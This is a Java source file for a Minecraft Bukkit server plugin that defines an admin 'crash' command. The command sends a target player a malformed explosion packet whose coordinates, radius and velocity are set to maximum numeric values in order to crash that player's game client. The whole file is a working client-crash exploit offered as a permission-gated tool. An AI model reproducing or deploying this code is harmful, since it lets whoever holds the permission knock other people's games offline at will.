package com.redeceleste.celesteessentials.command.impl.admin;

import com.redeceleste.celesteessentials.CelesteEssentials;
import com.redeceleste.celesteessentials.command.Command;
import com.redeceleste.celesteessentials.manager.ConfigManager;
import com.redeceleste.celesteessentials.util.impl.BarUtil;
import com.redeceleste.celesteessentials.util.impl.ChatUtil;
import com.redeceleste.celesteessentials.util.impl.TitleUtil;
import lombok.SneakyThrows;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.lang.reflect.Constructor;
import java.util.Collections;
import java.util.List;

import static com.redeceleste.celesteessentials.util.ReflectionUtil.getNMS;
import static com.redeceleste.celesteessentials.util.ReflectionUtil.sendPacket;

public class CrashCommand extends Command {
    private final CelesteEssentials main;
    private final ConfigManager config;
    private final ChatUtil chat;
    private final BarUtil bar;
    private final TitleUtil title;

    private final Object packet;

    @SneakyThrows
    public CrashCommand(CelesteEssentials main) {
        super("crash", "crashar");
        this.main = main;
        this.config = main.getConfigManager();
        this.chat = main.getMessageFactory().getChat();
        this.bar = main.getMessageFactory().getBar();
        this.title = main.getMessageFactory().getTitle();

        Class<?> ppoueClass = getNMS("PacketPlayOutExplosion");
        Class<?> v3dClass = getNMS("Vec3D");

        Constructor<?> v3dCon = v3dClass.getConstructor(double.class, double.class, double.class);
        Constructor<?> ppoueCon = ppoueClass.getConstructor(double.class, double.class, double.class, float.class, List.class, v3dClass);

        Object vec3d = v3dCon.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
        this.packet = ppoueCon.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), vec3d);
    }

    @Override
    public boolean execute(CommandSender sender, String commandLabel, String[] args) {
        String perm = config.getConfig("Permission.Admin");
        String crashPerm = config.getConfig("Permission.Crash");
        if (!sender.hasPermission(perm) && !sender.hasPermission(crashPerm)) {
            chat.send(sender, "No-Permission.Admin");
            return false;
        }

        if (args.length != 1) {
            chat.send(sender, "Crash.Invalid-Argument");
            bar.send(sender, "Crash.Invalid-Argument-Bar");
            title.send(sender, "Crash.Invalid-Argument-Title");
            return false;
        }

        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            chat.send(sender, "Crash.Player-Not-Found",
                    chat.build("{player}", args[0]));
            bar.send(sender, "Crash.Player-Not-Found-Bar",
                    chat.build("{player}", args[0]));
            title.send(sender, "Crash.Player-Not-Found-Title",
                    chat.build("{player}", args[0]));
            return false;
        }

        sendPacket(t, packet);
        chat.send(sender, "Crash.Success",
                chat.build("{player}", t.getName()));
        bar.send(sender, "Crash.Success-Bar",
                chat.build("{player}", t.getName()));
        title.send(sender, "Crash.Success-Title",
                chat.build("{player}", t.getName()));
        return false;
    }
}
